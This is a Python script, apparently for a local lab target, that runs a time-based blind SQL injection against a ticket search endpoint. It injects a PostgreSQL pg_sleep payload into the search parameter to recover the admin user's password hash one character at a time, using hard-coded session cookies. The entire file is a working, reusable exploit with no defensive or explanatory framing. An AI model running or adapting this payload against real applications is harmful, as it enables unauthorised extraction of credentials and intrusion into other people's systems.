import requests
import string
import time

BASE_URL = "http://127.0.0.1:5001/tickets/search/"

COOKIES = {
    "sessionid": "8m74qf9u0sqrrqpmta4th8oxy2kxt1e2",
    "csrftoken": "pS2aNLZmnwhlPMugucyhmfwTE7spgVpK",
}

CHARSET = string.ascii_letters + string.digits + "$+/=_.-"
SLEEP_SECONDS = 3
THRESHOLD = 2.0  # seconds — above this, we call it a hit


def char_matches(position, char):
    """Ask the DB to sleep only if this character is correct; time the response."""
    payload = (
        f"zzznomatch%' OR (SELECT CASE WHEN SUBSTRING(password,{position},1)='{char}' "
        f"THEN pg_sleep({SLEEP_SECONDS}) ELSE pg_sleep(0) END "
        f"FROM auth_user WHERE username='admin')::text='x' -- "
    )
    start = time.time()
    requests.get(BASE_URL, params={"q": payload}, cookies=COOKIES)
    elapsed = time.time() - start
    return elapsed > THRESHOLD


def extract_hash_blind_timing(max_len=100):
    found = ""
    for position in range(1, max_len + 1):
        hit = None
        for char in CHARSET:
            if char_matches(position, char):
                hit = char
                break
        if hit is None:
            print(f"No match at position {position} — assuming end of hash.")
            break
        found += hit
        print(f"[{position}] {found}")
    return found


if __name__ == "__main__":
    result = extract_hash_blind_timing()
    print("\nRecovered hash (timing-based):", result)